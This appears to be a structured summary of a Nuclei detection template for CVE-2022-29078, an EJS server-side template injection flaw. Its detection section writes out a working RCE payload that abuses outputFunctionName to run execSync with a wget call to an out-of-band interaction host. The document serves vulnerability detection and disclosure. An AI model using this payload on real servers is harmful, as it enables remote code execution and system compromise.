---
cve_id: CVE-2022-29078
template_path: nuclei-templates/http/cves/2022/CVE-2022-29078.yaml
affected_product: Node.js Embedded JavaScript
severity: critical
authentication: none
external_callback: true
affected_versions: 3.1.6
preconditions: []
poc_classification: rce
---

## Vulnerability
Server-side template injection (SSTI) in Node.js Embedded JavaScript 3.1.6 allows unauthenticated remote code execution (RCE). The `settings[view options][outputFunctionName]` query parameter is incorrectly parsed as an internal option, enabling attackers to overwrite it with arbitrary OS commands executed during template compilation.

CVE-2022-29078, CWE-94, CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Leads to full system compromise, unauthorized access, and data leakage.

## PoC / Detection
Classification: rce

The template performs detection by sending a GET request to `/page?id={{randstr}}&settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('wget+http://{{interactsh-url}}');s` and verifies success through an OOB HTTP interaction on interactsh combined with the body containing "You are viewing page number".

## References
- https://eslam.io/posts/ejs-server-side-template-injection-rce/
- https://github.com/miko550/CVE-2022-29078
- https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf
- https://nvd.nist.gov/vuln/detail/CVE-2022-29078
- https://github.com/mde/ejs/releases
